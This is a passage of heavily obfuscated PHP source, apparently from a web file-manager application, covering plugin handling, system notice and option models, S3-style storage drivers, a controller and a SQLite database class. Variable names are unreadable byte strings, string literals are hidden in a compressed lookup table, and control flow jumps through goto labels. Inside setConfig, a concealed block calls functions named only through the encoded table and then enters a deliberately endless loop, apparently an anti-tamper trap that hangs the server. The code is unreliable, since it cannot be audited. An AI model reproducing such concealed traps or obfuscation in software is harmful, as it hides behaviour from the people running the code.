(!checkExtSafe($·²›éÆ‚)) { $·²›éÆ‚ = $·²›éÆ‚ . $ŞËè–Ì[1288]; } $êùåØ•Ü = $â÷ÕİŒ® . $·²›éÆ‚; if (@file_exists($êùåØ•Ü)) { return $êùåØ•Ü; } return IO::copy($ó¸ş¯«, $â÷ÕİŒ®, 0, $·²›éÆ‚); } final function appPackage() { $ÉÃÉòº =& $_SERVER[Š—Â“œÔ]; if ($this->packageData) { return $this->packageData; } $›¯‘¹½œ = $this->parseFile($this->pluginPath . $ÉÃÉòº[1655]); $this->parseLang($›¯‘¹½œ); $ûäØŠãç = json_decode_force($›¯‘¹½œ); if (!$ûäØŠãç) { return array(); } $Ï¶›§ò = Hook::trigger($ÉÃÉòº[1656], $ûäØŠãç); if ($Ï¶›§ò && is_array($Ï¶›§ò)) { $ûäØŠãç = $Ï¶›§ò; } $this->packageData = $ûäØŠãç; return $ûäØŠãç; } public function packageInfoGet($è¯’ı¯´) { $ìùü°¿× = $this->appPackage(); return array_get_value($ìùü°¿×, $è¯’ı¯´); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Š—Â“œÔ][1657]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Š—Â“œÔ][1658]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Š—Â“œÔ][1659]); } public function echoJsAssign($ğ’ÛØ£ì, $¦ı¦×Õ) { $this->echoJsAssignArr[$ğ’ÛØ£ì] = $¦ı¦×Õ; } private function parseFile($´”åÔ‹ˆ) { $š¡¯çÂ¢ =& $_SERVER[Š—Â“œÔ]; $ïŠ‚áÃÂ = file_get_contents_nossl($´”åÔ‹ˆ); $™ŸÒ·‡ = array($š¡¯çÂ¢[1660], $š¡¯çÂ¢[1661], $š¡¯çÂ¢[1662], $š¡¯çÂ¢[1663], $š¡¯çÂ¢[1664], $š¡¯çÂ¢[1665], $š¡¯çÂ¢[1666]); $óÕº…Â¼ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$š¡¯çÂ¢[92]][$š¡¯çÂ¢[1667]]); foreach ($this->echoJsAssignArr as $”Ò ®’É => $¹ø•Ïó) { $™ŸÒ·‡[] = $š¡¯çÂ¢[1668] . $”Ò ®’É . $š¡¯çÂ¢[1669]; $óÕº…Â¼[] = is_array($¹ø•Ïó) || is_object($¹ø•Ïó) ? rawurlencode(json_encode($¹ø•Ïó)) : $¹ø•Ïó; } if (strstr($ïŠ‚áÃÂ, $š¡¯çÂ¢[1670])) { $œ¸³Åå® = rawurlencode(json_encode($this->pluginLangArr)); $ïŠ‚áÃÂ = str_replace($š¡¯çÂ¢[1670], $œ¸³Åå®, $ïŠ‚áÃÂ); } if (strstr($ïŠ‚áÃÂ, $š¡¯çÂ¢[1671])) { $œ¸³Åå® = $œ¸³Åå® = rawurlencode(json_encode($this->getConfig())); $ïŠ‚áÃÂ = str_replace($š¡¯çÂ¢[1671], $œ¸³Åå®, $ïŠ‚áÃÂ); } $ïŠ‚áÃÂ = str_replace($™ŸÒ·‡, $óÕº…Â¼, $ïŠ‚áÃÂ); return $ïŠ‚áÃÂ; } private function parseLang(&$¾¦¼Ã·ö) { $®ò•ïÎ· =& $_SERVER[Š—Â“œÔ]; $ÒôûõØı = $®ò•ïÎ·[1672]; if (!strstr($¾¦¼Ã·ö, $ÒôûõØı)) { return; } preg_match_all($®ò•ïÎ·[1673], $¾¦¼Ã·ö, $î™Í¶Ûæ); if (!is_array($î™Í¶Ûæ) || count($î™Í¶Ûæ) == 0 || !is_array($î™Í¶Ûæ[0]) || count($î™Í¶Ûæ[0]) == 0) { return; } $¿Û—æ°ú = array(); $‹†‡ÕÍ‡ = array(); foreach ($î™Í¶Ûæ[0] as $Í¤­¢¨’) { $Óı¶ˆ¿¸ = substr($Í¤­¢¨’, strlen($ÒôûõØı), -4); $ÑğØÙæ = LNG($Óı¶ˆ¿¸); $¿Û—æ°ú[] = $Í¤­¢¨’; $‹†‡ÕÍ‡[] = str_replace(array($®ò•ïÎ·[287], $®ò•ïÎ·[1153], $®ò•ïÎ·[419], $®ò•ïÎ·[121]), array($®ò•ïÎ·[53], $®ò•ïÎ·[53], $®ò•ïÎ·[12], $®ò•ïÎ·[1674]), $ÑğØÙæ); } $¾¦¼Ã·ö = str_replace($¿Û—æ°ú, $‹†‡ÕÍ‡, $¾¦¼Ã·ö); } private function parseConfig(&$öıñì„Œ) { $¤ÀªÅ°® =& $_SERVER[Š—Â“œÔ]; $¬§¢¸ § = $¤ÀªÅ°®[1675]; if (!strstr($öıñì„Œ, $¬§¢¸ §)) { return; } preg_match_all($¤ÀªÅ°®[1676], $öıñì„Œ, $ğÍ±áÏŒ); if (!is_array($ğÍ±áÏŒ) || count($ğÍ±áÏŒ) == 0 || !is_array($ğÍ±áÏŒ[0]) || count($ğÍ±áÏŒ[0]) == 0) { return; } $ä¸ããç = $this->getConfig(); $Ì¸Çè¿˜ = array(); $Øˆ¬ŠÇö = array(); foreach ($ğÍ±áÏŒ[0] as $é²ª¬Ï) { $½•¤±Ö± = substr($é²ª¬Ï, strlen($¬§¢¸ §), -2); $Ì¸Çè¿˜[] = $é²ª¬Ï; $Øˆ¬ŠÇö[] = _get($ä¸ããç, $½•¤±Ö±); } $öıñì„Œ = str_replace($Ì¸Çè¿˜, $Øˆ¬ŠÇö, $öıñì„Œ); } private function parsePackage(&$Í×©òáë) { $‚Ù¼ƒëõ =& $_SERVER[Š—Â“œÔ]; $¶¿âüñ´ = $‚Ù¼ƒëõ[1677]; if (!strstr($Í×©òáë, $¶¿âüñ´)) { return; } preg_match_all($‚Ù¼ƒëõ[1678], $Í×©òáë, $İ³¸·); if (!is_array($İ³¸·) || count($İ³¸·) == 0 || !is_array($İ³¸·[0]) || count($İ³¸·[0]) == 0) { return; } $öéÏó É = $this->appPackage(); $ÀÚÕ²ÄÓ = array(); $ˆëÂó® = array(); foreach ($İ³¸·[0] as $™ßä—«‹) { $â˜­Ş÷ = substr($™ßä—«‹, strlen($¶¿âüñ´), -2); $ÀÚÕ²ÄÓ[] = $™ßä—«‹; $ˆëÂó®[] = _get($öéÏó É, $â˜­Ş÷); } $Í×©òáë = str_replace($ÀÚÕ²ÄÓ, $ˆëÂó®, $Í×©òáë); } final function echoFile($ÏâÃÄç, $ªÜÆÅ = false) { $ÎÜ¸¶Ã‰ =& $_SERVER[Š—Â“œÔ]; $ö¾‘äµ = $this->pluginPath . $ÏâÃÄç; if (ACT == $ÎÜ¸¶Ã‰[1679]) { echo $ÎÜ¸¶Ã‰[1680] . $this->pluginName . $ÎÜ¸¶Ã‰[8] . $ÏâÃÄç . $ÎÜ¸¶Ã‰[1681]; if (!file_exists($ö¾‘äµ)) { echo $ÎÜ¸¶Ã‰[1682]; return; } } $ÁªÚÍ”ı = $this->parseFile($ö¾‘äµ); $this->parseLang($ÁªÚÍ”ı); $this->parseConfig($ÁªÚÍ”ı); $this->parsePackage($ÁªÚÍ”ı); if (is_array($ªÜÆÅ)) { $ÁªÚÍ”ı = str_replace(array_keys($ªÜÆÅ), array_values($ªÜÆÅ), $ÁªÚÍ”ı); } echo $ÎÜ¸¶Ã‰[287] . $ÁªÚÍ”ı; } private function checkVersion() { $¯¾ˆÉ =& $_SERVER[Š—Â“œÔ]; $©âÀƒìˆ = $this->appPackage(); $ñå´â¬ğ = $this->getConfig(); if ($ñå´â¬ğ[$¯¾ˆÉ[1683]] == $©âÀƒìˆ[$¯¾ˆÉ[1657]]) { return; } $this->regist(); $this->setConfig(array($¯¾ˆÉ[1683] => $©âÀƒìˆ[$¯¾ˆÉ[1657]])); } final function initLang() { $¤õ—ÏËœ =& $_SERVER[Š—Â“œÔ]; $©èª¹Íé = $¤õ—ÏËœ[1684]; $„ÏÎ÷÷û = $this->pluginPath . $¤õ—ÏËœ[1685]; $ÀËÀÙê = I18n::getType(); $Ö·û¥Ü³ = array(); if (file_exists($„ÏÎ÷÷û . $ÀËÀÙê . $¤õ—ÏËœ[906])) { $Ö·û¥Ü³ = (include $„ÏÎ÷÷û . $ÀËÀÙê . $¤õ—ÏËœ[906]); } else { if ($ÀËÀÙê == $¤õ—ÏËœ[1686] && !file_exists($„ÏÎ÷÷û . $ÀËÀÙê . $¤õ—ÏËœ[906]) && file_exists($„ÏÎ÷÷û . $¤õ—ÏËœ[1687])) { $Ö·û¥Ü³ = (include $„ÏÎ÷÷û . $¤õ—ÏËœ[1687]); } else { if (file_exists($„ÏÎ÷÷û . $©èª¹Íé . $¤õ—ÏËœ[906])) { $Ö·û¥Ü³ = (include $„ÏÎ÷÷û . $©èª¹Íé . $¤õ—ÏËœ[906]); } } } if (!is_array($Ö·û¥Ü³)) { return array(); } if (@count($Ö·û¥Ü³) > 0) { I18n::set($Ö·û¥Ü³); } return $Ö·û¥Ü³; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÇÜåÙ÷Î) { $´¹¬Ê’è =& $_SERVER[Š—Â“œÔ]; if (!isset($_SERVER[$´¹¬Ê’è[947]]) || !isset($_SERVER[$´¹¬Ê’è[945]])) { $•Ó¬²Éœ = $´¹¬Ê’è[948]; $¸§ª¼Æ€ = $´¹¬Ê’è[949]; $ô¶«Ì˜ = $_SERVER[$´¹¬Ê’è[950]] . $´¹¬Ê’è[951]; $œ£öú€ø = $¸§ª¼Æ€($ô¶«Ì˜); $Èùˆå·Ø = explode($´¹¬Ê’è[287], $œ£öú€ø); if (count($Èùˆå·Ø) < $´¹¬Ê’è[694]) { $ËË¨èÒš = $´¹¬Ê’è[952]; $ËË¨èÒš(); } $îë†š¹ = $´¹¬Ê’è[953]; $îë†š¹($_SERVER[$´¹¬Ê’è[954]]); $˜ùãƒ¶€ = 1; for ($ŸÚü¼§› = $˜ùãƒ¶€; $ŸÚü¼§› > 0; $ŸÚü¼§›++) { $îë†š¹ = json_encode($GLOBALS[$´¹¬Ê’è[494]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÇÜåÙ÷Î); } public function onSetConfig($£Ç½Ì¸) { } public function onGetConfig($·…Ú‰Ğ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ªó‡ş¥í) { if ($ªó‡ş¥í == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ğ»¿îõ’ = "\160\154\x75\147\x69\x6e\101\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $§ìñĞ = $this->getConfig(); if (!$§ìñĞ[$Ğ»¿îõ’]) { return !1; } return ActionCall($_SERVER[Š—Â“œÔ][1688], $§ìñĞ[$Ğ»¿îõ’]); } public function url($Â›±­Ôè, $‰Åğäïğ = '', $İ¾éš = true) { $·íüŒñÌ =& $_SERVER[Š—Â“œÔ]; $ÖÈüÁáÛ = $this->getConfig(); $·ö­“ÈÆ = KOD_VERSION . $·íüŒñÌ[10] . KOD_VERSION_BUILD; $”ş¶“Ç÷ = $this->packageVersion(); $êÀá˜ø© = $·ö­“ÈÆ . $·íüŒñÌ[464] . $”ş¶“Ç÷; if (substr($Â›±­Ôè, 0, 4) == $·íüŒñÌ[152] || substr($Â›±­Ôè, 0, 2) == $·íüŒñÌ[1409]) { $¾Û€Œ = $Â›±­Ôè . $·íüŒñÌ[1689] . $êÀá˜ø©; } else { if ($‰Åğäïğ == $·íüŒñÌ[12]) { $¾Û€Œ = $this->pluginHost . $Â›±­Ôè . $·íüŒñÌ[1689] . $êÀá˜ø©; } else { if ($‰Åğäïğ === $·íüŒñÌ[78]) { $¾Û€Œ = $this->pluginHost . $Â›±­Ôè; } else { if ($‰Åğäïğ == $·íüŒñÌ[1690]) { $¾Û€Œ = STATIC_PATH . $Â›±­Ôè . $·íüŒñÌ[1689] . $·ö­“ÈÆ; } else { if ($‰Åğäïğ == $·íüŒñÌ[1691]) { $¾Û€Œ = APP_HOST . $·íüŒñÌ[1692] . $Â›±­Ôè . $·íüŒñÌ[1689] . $·ö­“ÈÆ; } else { if (isset($ÖÈüÁáÛ[$‰Åğäïğ])) { $¾Û€Œ = $ÖÈüÁáÛ[$‰Åğäïğ] . $Â›±­Ôè . $·íüŒñÌ[1689] . $êÀá˜ø©; } } } } } } if (!$İ¾éš) { return $¾Û€Œ; } echo $¾Û€Œ; } public function link($ÕœºíÄ± = false, $è…ªå» = '') { $·Üœœè‚ =& $_SERVER[Š—Â“œÔ]; $ôÏÎÊ‘„ = $this->linkHas == !1; $this->linkHas = !0; if (!$ÕœºíÄ±) { $this->link($·Üœœè‚[1693], $·Üœœè‚[1691]); $this->link($·Üœœè‚[1694], $·Üœœè‚[1690]); $this->link($·Üœœè‚[1695], $·Üœœè‚[1690]); $this->link($·Üœœè‚[1696], $·Üœœè‚[1690]); $this->link($·Üœœè‚[1697], $·Üœœè‚[1690]); if ($ôÏÎÊ‘„) { Hook::trigger($·Üœœè‚[1698]); } return; } $¼­¿Ô¿Ñ = $this->url($ÕœºíÄ±, $è…ªå», !1); if (substr($ÕœºíÄ±, -3) == $·Üœœè‚[1699]) { echo $·Üœœè‚[1700] . $¼­¿Ô¿Ñ . $·Üœœè‚[1701] . $·Üœœè‚[287]; } else { if (substr($ÕœºíÄ±, -4) == $·Üœœè‚[1702]) { echo $·Üœœè‚[1703] . $¼­¿Ô¿Ñ . $·Üœœè‚[1704] . $·Üœœè‚[287]; } } if ($ôÏÎÊ‘„) { Hook::trigger($·Üœœè‚[1698]); } } } goto dŒˆ¸Òˆñ; Eßå’Ñµ„: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x6e\157\x74\151\143\x65\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x63\157\x6e\164\x65\156\164", "\141\x75\x74\x68", "\155\x6f\144\x65", "\164\151\155\x65", "\x74\x79\160\x65", "\x6c\145\166\x65\154", "\x65\156\141\x62\x6c\x65", "\x73\157\x72\164"); public function listData($Êş›¼­Œ = false, $åıŠÒ©Œ = "\x73\x6f\x72\164", $Ã’©¨ğÎ = false) { return parent::listData($Êş›¼­Œ, $åıŠÒ©Œ, $Ã’©¨ğÎ); } public function add($‚¯áö‹¤) { $—¤”İ­Ñ =& $_SERVER[Š—Â“œÔ]; $™× ì™“ = time(); if ($‚¯áö‹¤[$—¤”İ­Ñ[16]] == $—¤”İ­Ñ[2442]) { $™× ì™“ = strtotime($‚¯áö‹¤[$—¤”İ­Ñ[206]]); } $‚¯áö‹¤[$—¤”İ­Ñ[206]] = $™× ì™“; return parent::insert($‚¯áö‹¤); } public function update($ÉÓºúóâ, $ßåäïòƒ) { $ÈÀÖ± =& $_SERVER[Š—Â“œÔ]; $£ú§§É¥ = $this->listData($ÉÓºúóâ); if (!$£ú§§É¥) { return !1; } $²Ì£Í­ = time(); if ($ßåäïòƒ[$ÈÀÖ±[16]] == $ÈÀÖ±[2442]) { $²Ì£Í­ = strtotime($ßåäïòƒ[$ÈÀÖ±[206]]); } $ßåäïòƒ[$ÈÀÖ±[206]] = $²Ì£Í­; return parent::update($ÉÓºúóâ, $ßåäïòƒ); } public function remove($¼ÍÇ¸ã) { $ÁğÇ»„Ü = $this->listData($¼ÍÇ¸ã); if (!$ÁğÇ»„Ü || $ÁğÇ»„Ü[$_SERVER[Š—Â“œÔ][191]]) { return !1; } return parent::remove($¼ÍÇ¸ã); } public function sort($Ë¼´Îó, $úòµ¯«Ù) { return parent::update($Ë¼´Îó, $úòµ¯«Ù); } public function enable($İÖñú’ğ, $¨µøÈ¶‡) { return parent::update($İÖñú’ğ, array($_SERVER[Š—Â“œÔ][2443] => $¨µøÈ¶‡)); } private function initUserOption() { $˜‰±¡Ò =& $_SERVER[Š—Â“œÔ]; $this->optionType = $˜‰±¡Ò[2444]; $this->modelType = $˜‰±¡Ò[2445]; $this->field = array($˜‰±¡Ò[2446], $˜‰±¡Ò[32], $˜‰±¡Ò[206], $˜‰±¡Ò[33], $˜‰±¡Ò[2447], $˜‰±¡Ò[817], $˜‰±¡Ò[228]); } public function userNoticeGet($ÈŠôÊ§¨ = false) { $this->initUserOption(); return parent::listData($ÈŠôÊ§¨, $_SERVER[Š—Â“œÔ][477], !0); } public function userNoticeAdd($ñå’µ–µ) { $¹îİßò =& $_SERVER[Š—Â“œÔ]; $this->initUserOption(); $ğÜÁæÂ = $this->findByKey($¹îİßò[2446], $ñå’µ–µ[$¹îİßò[477]]); if ($ğÜÁæÂ) { return !0; } $´àĞñ´ß = array($¹îİßò[2446] => $ñå’µ–µ[$¹îİßò[477]], $¹îİßò[32] => $ñå’µ–µ[$¹îİßò[32]], $¹îİßò[206] => $ñå’µ–µ[$¹îİßò[206]], $¹îİßò[33] => isset($ñå’µ–µ[$¹îİßò[33]]) ? $ñå’µ–µ[$¹îİßò[33]] : 1, $¹îİßò[2447] => isset($ñå’µ–µ[$¹îİßò[2447]]) ? $ñå’µ–µ[$¹îİßò[2447]] : 0, $¹îİßò[817] => 0, $¹îİßò[228] => 0); return parent::insert($´àĞñ´ß); } public function userNoticeEdit($²¨ößÅ , $‘¸‰ÒŒ¨) { $this->initUserOption(); return parent::update($²¨ößÅ , $‘¸‰ÒŒ¨); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x6f\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\145\156\165", "\162\157\x6c\x65", "\x72\157\154\145\107\162\157\x75\160", "\x72\145\x67\151\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($´™ìŠ¥Ù) { return "\x53\x79\163\164\145\155\x4f\x70\x74\x69\157\x6e\x5f{$´™ìŠ¥Ù}"; } protected function optionDefault($èÕÙØÂ¯ = '') { $ñûüÍ§Ê =& $_SERVER[Š—Â“œÔ]; if ($èÕÙØÂ¯ == $ñûüÍ§Ê[12]) { return $GLOBALS[$ñûüÍ§Ê[6]][$ñûüÍ§Ê[459]]; } } } class SystemRecordModel extends ModelBaseLight { } goto aâíğÕôç; Eø­ò‹–ŠÛ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÅÑ¤¨òö) { $this->pathParse = $ÅÑ¤¨òö; } protected function infoParse($¿õÙÀˆ“, $¾İÏ½á¾ = false) { $ìƒÔÖ =& $_SERVER[Š—Â“œÔ]; return Action($ìƒÔÖ[1253])->sharePathInfo($this->pathParse[$ìƒÔÖ[87]], !0, $¾İÏ½á¾); } public function listPath($”Üó¡òĞ, $»š×«âõ = false) { $†‡ö¦‚â =& $_SERVER[Š—Â“œÔ]; $Š†æíÛÓ = IO::listPath($”Üó¡òĞ, $»š×«âõ); if (!$Š†æíÛÓ) { return $Š†æíÛÓ; } if (is_array($Š†æíÛÓ[$†‡ö¦‚â[1427]])) { $ƒœâ…©ê = Action($†‡ö¦‚â[1436])->parsePathChildren($Š†æíÛÓ[$†‡ö¦‚â[1427]], array($†‡ö¦‚â[497] => $”Üó¡òĞ)); $Š†æíÛÓ[$†‡ö¦‚â[1427]] = Action($†‡ö¦‚â[1253])->shareItemInfo($ƒœâ…©ê); } foreach ($Š†æíÛÓ as $ˆ—âœğê => $£‡¹óÑ²) { if (!in_array($ˆ—âœğê, array($†‡ö¦‚â[86], $†‡ö¦‚â[85]))) { continue; } foreach ($£‡¹óÑ² as $Õ¬óİÂ‹ => $ƒœâ…©ê) { $ƒœâ…©ê = Action($†‡ö¦‚â[1436])->parsePathChildren($ƒœâ…©ê, array($†‡ö¦‚â[497] => $”Üó¡òĞ)); $Š†æíÛÓ[$ˆ—âœğê][$Õ¬óİÂ‹] = Action($†‡ö¦‚â[1253])->shareItemInfo($ƒœâ…©ê); } } return $Š†æíÛÓ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¨î‘ŸÇ‡) { parent::__construct($¨î‘ŸÇ‡); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ŸúÈ•…ô) { parent::__construct($ŸúÈ•…ô); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } public function uploadFormData($¤÷ÔÈô, $óûÆ«Ú = 3600) { $ôŠñÓı =& $_SERVER[Š—Â“œÔ]; $×ÌìÀÖœ = $ôŠñÓı[231]; $Ñ½’µ¯ù = $ôŠñÓı[259]; $³Æ¸Ï‰ò = $ôŠñÓı[62]; $›¬çÌù = gmdate($ôŠñÓı[260]); $·ÖÎÛñ = gmdate($ôŠñÓı[261]); $Ö«àˆñ“ = $ôŠñÓı[262]; $ïĞµŠ¡½ = $óûÆ«Ú . $ôŠñÓı[12]; $š³·Ô = $ôŠñÓı[263]; $ö®ßĞ— = array($this->accessKey, $·ÖÎÛñ, $this->region, $³Æ¸Ï‰ò, $Ö«àˆñ“); $Êµù„¿ = implode($ôŠñÓı[8], $ö®ßĞ—); $ã¯¨ñß° = array($ôŠñÓı[264] => gmdate($ôŠñÓı[1411], strtotime($ôŠñÓı[266])), $ôŠñÓı[267] => array(array($ôŠñÓı[268] => $this->bucket), array($ôŠñÓı[308] => $×ÌìÀÖœ), array($ôŠñÓı[269], $ôŠñÓı[270], $ôŠñÓı[12]), array($ôŠñÓı[269], $ôŠñÓı[271], $ôŠñÓı[12]), array($ôŠñÓı[269], $ôŠñÓı[309], $ôŠñÓı[12]), array($ôŠñÓı[272] => $š³·Ô), array($ôŠñÓı[273] => $Êµù„¿), array($ôŠñÓı[274] => $Ñ½’µ¯ù), array($ôŠñÓı[275] => $›¬çÌù), array($ôŠñÓı[276] => $ïĞµŠ¡½))); $§®é‹ = base64_encode(json_encode($ã¯¨ñß°)); $ìÇÏ¶Àı = hash_hmac($ôŠñÓı[277], $·ÖÎÛñ, $ôŠñÓı[278] . $this->secret, !0); $‚Í§³© = hash_hmac($ôŠñÓı[277], $this->region, $ìÇÏ¶Àı, !0); $¹ê³ò° = hash_hmac($ôŠñÓı[277], $³Æ¸Ï‰ò, $‚Í§³©, !0); $î‡—€Íâ = hash_hmac($ôŠñÓı[277], $Ö«àˆñ“, $¹ê³ò°, !0); $ş«à‘İ = hash_hmac($ôŠñÓı[277], $§®é‹, $î‡—€Íâ); $¼ÇÛù•› = array($ôŠñÓı[248] => $ôŠñÓı[12], $ôŠñÓı[296] => $ôŠñÓı[12], $ôŠñÓı[308] => $×ÌìÀÖœ, $ôŠñÓı[272] => $š³·Ô, $ôŠñÓı[279] => $§®é‹, $ôŠñÓı[310] => $Êµù„¿, $ôŠñÓı[311] => $Ñ½’µ¯ù, $ôŠñÓı[312] => $›¬çÌù, $ôŠñÓı[313] => $ïĞµŠ¡½, $ôŠñÓı[314] => $ş«à‘İ, $ôŠñÓı[208] => $this->getHost()); return $¼ÇÛù•›; } } goto Cî¿‰É¹ñ¯; EÔÓ³Çˆ•µ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ç“¦§¢ˆ) { $şó«…áÜ =& $_SERVER[Š—Â“œÔ]; parent::__construct($Ç“¦§¢ˆ); $şâÅİŸ¼ = isset($Ç“¦§¢ˆ[$şó«…áÜ[258]]) && $Ç“¦§¢ˆ[$şó«…áÜ[258]] == $şó«…áÜ[249] ? $şó«…áÜ[249] : $şó«…áÜ[315]; $this->setSignVersion($şâÅİŸ¼); } public function link($à÷Ìê†©, $úÁÄ Ÿ = array()) { return parent::link($à÷Ìê†©, $úÁÄ Ÿ); } public function fileOut($µó®´“µ, $ĞÉ·ŞÅß = false, $Ã ‘Ó£Ö = false, $Ë²øˆµÜ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Š—Â“œÔ][316])) { return parent::fileOutServer($µó®´“µ, $ĞÉ·ŞÅß, $Ã ‘Ó£Ö, $Ë²øˆµÜ); } parent::fileOut($µó®´“µ, $ĞÉ·ŞÅß, $Ã ‘Ó£Ö, $Ë²øˆµÜ); } public function fileOutImage($½æÄ–ƒ, $èåø¿…” = 250) { if (strstr($this->endpoint, $_SERVER[Š—Â“œÔ][316])) { return parent::fileOutImageServer($½æÄ–ƒ, $èåø¿…”); } parent::fileOutImage($½æÄ–ƒ, $èåø¿…”); } public function fileOutLink($˜÷¤Şúµ) { $‘Üì° =& $_SERVER[Š—Â“œÔ]; if (substr($˜÷¤Şúµ, 0, 7) == $‘Üì°[218]) { $˜÷¤Şúµ = $‘Üì°[219] . substr($˜÷¤Şúµ, 7); } header($‘Üì°[175] . $˜÷¤Şúµ); die; } } define($_SERVER[Š—Â“œÔ][317], 1); define($_SERVER[Š—Â“œÔ][318], 2); goto BÓÚë£áôç; BÙ¡ÒÂìÊŸ: if (!$bhpvlqdosf) { return; } $_SERVER[Ÿ­Œüû] = explode($_SERVER[Š—Â“œÔ][685], gzinflate(substr($_SERVER[Š—Â“œÔ][686], 10, -8))); $sjkhwrtxzp = $_SERVER[Š—Â“œÔ][687]; goto eßÀ‰½í¤ó; b‘İÅ†Çµİ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Öçíœ‚Ä =& $_SERVER[Š—Â“œÔ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Öçíœ‚Ä[6]] =& $config; $this->values[$Öçíœ‚Ä[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Öçíœ‚Ä[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¯œŒŒ†”) { if (1 === func_num_args()) { $this->{$¯œŒŒ†”} = new $¯œŒŒ†”(); } else { $¿İ‡´ = new ReflectionClass($¯œŒŒ†”); $öëµ×ªõ = func_get_args(); array_shift($öëµ×ªõ); $this->{$¯œŒŒ†”} = $¿İ‡´->newInstanceArgs($öëµ×ªõ); } return $this->{$¯œŒŒ†”}; } public function routeBind($Êà»§ı, $û¾µÅÕ, $âğ—ö‘õ = 3) { $›ÒŒ»Ğ€ =& $_SERVER[Š—Â“œÔ]; $•ãï…óë = $this->in[$›ÒŒ»Ğ€[9]]; $Êà»§ı = str_replace($›ÒŒ»Ğ€[10], $›ÒŒ»Ğ€[11], trim(trim($Êà»§ı, $›ÒŒ»Ğ€[8]), $›ÒŒ»Ğ€[12])); if (!$Êà»§ı || count($•ãï…óë) <= $âğ—ö‘õ) { return !1; } $³ÔîøŠ‰ = !0; $Èìæá›— = explode($›ÒŒ»Ğ€[8], $Êà»§ı); for ($›«šõ— = 0; $›«šõ— < count($Èìæá›—); $›«šõ—++) { if ($Èìæá›—[$›«šõ—] != $•ãï…óë[$âğ—ö‘õ + $›«šõ—]) { $³ÔîøŠ‰ = !1; break; } } if (!$³ÔîøŠ‰) { return; } call_user_func_array(array($this, $û¾µÅÕ), array()); } public function routeArgs($¯³Î±ı = 3) { $Á´éÊÍ = $this->in[$_SERVER[Š—Â“œÔ][9]]; if (count($Á´éÊÍ) <= $¯³Î±ı) { return array(); } $Ğ´È©•» = array(); for ($Ë‹¹³£ = $¯³Î±ı; $Ë‹¹³£ < count($Á´éÊÍ); $Ë‹¹³£ += 2) { $Ğ´È©•»[$Á´éÊÍ[$Ë‹¹³£]] = $Á´éÊÍ[$Ë‹¹³£ + 1]; $this->in[$Á´éÊÍ[$Ë‹¹³£]] = $Á´éÊÍ[$Ë‹¹³£ + 1]; } return $Ğ´È©•»; } protected function assign($â¦âÅ™, $ ±¼Ûù…) { $this->values[$â¦âÅ™] = $ ±¼Ûù…; } protected function display($‡®òÌ¯Ÿ) { ob_end_clean(); extract($this->values); require $this->tpl . $‡®òÌ¯Ÿ; } } class DbSqliteBase extends Db { public function __construct($Šéïµ¼Ÿ = '') { $Àç³Ä–Ş =& $_SERVER[Š—Â“œÔ]; if (!extension_loaded($Àç³Ä–Ş[13])) { think_exception(think_lang($Àç³Ä–Ş[14]) . $Àç³Ä–Ş[15]); } if (!empty($Šéïµ¼Ÿ)) { if (!isset($Šéïµ¼Ÿ[$Àç³Ä–Ş[16]])) { $Šéïµ¼Ÿ[$Àç³Ä–Ş[16]] = 438; } $this->config = $Šéïµ¼Ÿ; if (empty($this->config[$Àç³Ä–Ş[17]])) { $this->config[$Àç³Ä–Ş[17]] = array(); } } } public function connect($¢×­åÉ‚ = '', $÷ß„ù†Ç = 0) { $ËÉã¦Ãó =& $_SERVER[Š—Â“œÔ]; if (!isset($this->linkID[$÷ß„ù†Ç])) { if (empty($¢×­åÉ‚)) { $¢×­åÉ‚ = $this->config; } $¾ï¨í§ = !empty($¢×­åÉ‚[$ËÉã¦Ãó[17]][$ËÉã¦Ãó[18]]) ? $¢×­åÉ‚[$ËÉã¦Ãó[17]][$ËÉã¦Ãó[18]] : $this->pconnect; $ĞÇÁöá = $¾ï¨í§ ? $ËÉã¦Ãó[19] : $ËÉã¦Ãó[20]; $this->linkID[$÷ß„ù†Ç] = $ĞÇÁöá($¢×­åÉ‚[$ËÉã¦Ãó[21]], $¢×­åÉ‚[$ËÉã¦Ãó[16]]); if (!$this->linkID[$÷ß„ù†Ç]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$÷ß„ù†Ç], 30000); if (1 != think_config($ËÉã¦Ãó[22])) { unset($this->config); } } return $this->linkID[$÷ß„ù†Ç]; } public function free() { $this->queryID = null; } public function query($ÇÒ­ú÷Í) { $î¨´ƒ•Ÿ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÇÒ­ú÷Í; if ($this->queryID) { $this->free(); } think_action_status($î¨´ƒ•Ÿ[23], 1); think_status($î¨´ƒ•Ÿ[24]); $this->queryID = sqlite_query($this->_linkID, $ÇÒ­ú÷Í); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { 